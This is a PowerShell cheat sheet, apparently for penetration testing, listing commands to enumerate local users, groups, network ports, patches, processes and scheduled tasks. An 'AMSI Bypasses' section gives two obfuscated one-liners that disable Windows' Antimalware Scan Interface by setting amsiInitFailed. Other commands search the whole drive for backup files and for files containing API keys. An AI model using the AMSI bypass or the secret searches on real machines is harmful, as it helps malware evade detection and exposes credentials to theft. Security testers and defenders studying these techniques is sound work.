# Powershell

## Security Features

### Language Mode

```powershell
$ExecutionContext.SessionState.LanguageMode
```

### AppLocker Policy

```powershell
Get-AppLockerPolicy -Effective | Select -ExpandProperty RuleCollections
```

### AMSI Bypasses

```powershell
S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )

sET-ItEM ( 'V'+'aR' +  'IA' + 'blE:1q2'  + 'uZx'  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    GeT-VariaBle  ( "1Q2U"  +"zX"  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System'  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f'amsi','d','InitFaile'  ),(  "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```

## Users

### Show Local Users

```powershell
Get-LocalUser
```

### Show Number of Local Users

```powershell
Get-LocalUser | Measure-Object -line
```

### Get User by providing SID

```powershell
Get-LocalUser -SID "S-1-5-21-1394777289-3961777894-1791813945-501"
```

### Show Usernames and SIDs

```powershell
Get-LocalUser | Select-Object -Property Name,SID,Enabled
```

### Show Users that Do not Require a Password

```powershell
Get-LocalUser | Where-Object -Property PasswordRequired -Eq $False
```

## Groups

### Show Local Groups

```powershell
Get-LocalGroup
```

### Show Number of Local Groups

```powershell
Get-LocalGroup | Measure-Object -line
```

## Networks

### Get Network Adapter and IP Address Information

```powershell
Get-NetIPAddress
```

### Show only IPv4 Addresses and Show Output in Table Format

```powershell
Get-NetIPAddress -AddressFamily IPv4 | Format-Table
Get-NetIPAddress -AddressFamily IPv4 | ft
```

### Show Listening Ports

```powershell
Get-NetTCPConnection -State Listen
```

## Computers & Files

### Show Installed Patches

```powershell
Get-HotFix
```

### Show Information about Specific Patch

```powershell
Get-HotFix -ID KB4023834
```

### Search for Backup Files

```powershell
Get-ChildItem -Path C:\ -Include *.bak* -File -Recurse -ErrorAction SilentlyContinue -Force
gci -Path C:\ -Include *.bak* -File -Recurse -ErrorAction SilentlyContinue -Force
ls -Path C:\ -Include *.bak* -File -Recurse -ErrorAction SilentlyContinue -Force
```

### Search for Files Containing Specific String

```powershell
Get-ChildItem C:\* -Recurse | Select-String -pattern API_KEY
```

### Get Running Processes

```powershell
Get-Process
```

### Get All Scheduled Tasks

```powershell
Get-ScheduledTask
```

### Get Information about Specific Scheduled Task

```powershell
Get-ScheduledTask -TaskName "new-sched-task"
```

### Show Owner of File/Folder

```powershell
Get-ACL C:\
```
